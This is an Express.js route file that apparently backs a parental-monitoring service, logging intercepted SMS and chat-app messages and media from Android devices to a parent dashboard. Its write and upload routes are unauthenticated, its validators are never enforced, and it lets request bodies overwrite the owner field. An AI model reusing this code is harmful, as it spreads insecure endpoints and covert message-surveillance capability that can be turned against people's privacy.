const express = require('express');
const multer = require('multer');
const path = require('path');
const { body, param, query } = require('express-validator');
const router = express.Router();
const { Message, Device } = require('../models');
const { authenticate } = require('../middleware/auth');

// Configure multer for media uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/messages/');
  },
  filename: (req, file, cb) => {
    const uniqueName = `${Date.now()}-${Math.round(Math.random() * 1E9)}${path.extname(file.originalname)}`;
    cb(null, uniqueName);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB limit
});

// @route   GET /api/messages
// @desc    Get all messages
// @access  Private
router.get('/', authenticate, [
  query('deviceId').optional().isMongoId(),
  query('appName').optional(),
  query('limit').optional().isInt({ min: 1, max: 100 }),
  query('page').optional().isInt({ min: 1 })
], async (req, res) => {
  try {
    const { deviceId, appName, limit = 50, page = 1 } = req.query;

    const query = { parentId: req.userId };
    if (deviceId) query.deviceId = deviceId;
    if (appName) query.appName = appName;

    const skip = (parseInt(page) - 1) * parseInt(limit);

    const messages = await Message.find(query)
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(parseInt(limit))
      .populate('deviceId', 'deviceName');

    const total = await Message.countDocuments(query);

    res.json({
      success: true,
      count: messages.length,
      total,
      page: parseInt(page),
      pages: Math.ceil(total / parseInt(limit)),
      data: { messages }
    });
  } catch (error) {
    console.error('Get messages error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   POST /api/messages
// @desc    Log a new message (from Android app)
// @access  Public
router.post('/', [
  body('deviceId').notEmpty(),
  body('appName').isIn(['SMS', 'MMS', 'WHATSAPP', 'FACEBOOK', 'INSTAGRAM', 'SNAPCHAT', 'TELEGRAM', 'TIKTOK', 'VIBER', 'SKYPE', 'LINE', 'SIGNAL', 'OTHER']),
  body('direction').isIn(['INCOMING', 'OUTGOING']),
  body('content').notEmpty(),
  body('phoneNumber').optional(),
  body('contactName').optional(),
  body('timestamp').isISO8601(),
  body('isGroup').optional().isBoolean()
], async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.body.deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found'
      });
    }

    const message = new Message({
      deviceId: device._id,
      parentId: device.parentId,
      ...req.body,
      deviceId: device._id
    });

    await message.save();

    // Emit to parent dashboard
    const io = req.app.get('io');
    io.to(`parent_${device.parentId}`).emit('new_message', {
      message: await message.populate('deviceId', 'deviceName')
    });

    res.status(201).json({
      success: true,
      message: 'Message logged successfully',
      data: { message }
    });
  } catch (error) {
    console.error('Log message error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// @route   POST /api/messages/:id/media
// @desc    Upload message media
// @access  Public
router.post('/:id/media', upload.array('media', 10), async (req, res) => {
  try {
    const message = await Message.findById(req.params.id);
    if (!message) {
      return res.status(404).json({
        success: false,
        message: 'Message not found'
      });
    }

    if (!req.files || req.files.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No media files provided'
      });
    }

    const mediaFiles = req.files.map(file => ({
      type: file.mimetype.startsWith('image/') ? 'IMAGE' : 
            file.mimetype.startsWith('video/') ? 'VIDEO' : 
            file.mimetype.startsWith('audio/') ? 'AUDIO' : 'DOCUMENT',
      url: `/uploads/messages/${file.filename}`,
      path: file.path,
      fileName: file.originalname,
      fileSize: file.size,
      mimeType: file.mimetype
    }));

    message.media = [...(message.media || []), ...mediaFiles];
    await message.save();

    res.json({
      success: true,
      message: 'Media uploaded successfully',
      data: { media: mediaFiles }
    });
  } catch (error) {
    console.error('Upload media error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

module.exports = router;
